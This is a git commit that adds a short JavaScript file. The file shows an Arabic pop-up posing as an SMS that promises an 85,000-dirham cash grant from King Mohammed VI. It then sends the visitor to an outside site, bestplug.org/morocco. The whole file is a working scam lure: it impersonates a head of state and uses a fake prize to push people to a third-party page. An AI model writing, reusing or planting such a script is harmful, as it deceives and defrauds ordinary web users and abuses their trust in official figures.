1d822c63e0cbb5fcfd66d8abf47164e00494c7f9
vibeblog <enom02567@gmail.com>
2025-04-06 07:53:57 +0100

    Create morocco-active.js

---
+++ morocco-active.js
@@ -0,0 +1,5 @@
+var password = 'سحب النقود'
+password=prompt('SMS: مبروك، أنت مؤهل لتلقي منحة نقدية بقيمة 85000 درهم مغربي من الملك محمد السادس، اضغط موافق لسحب النقود الآن ','سحب النقود');
+if (password != 'سحب النقود') {
+location.href='https://bestplug.org/morocco';
+}
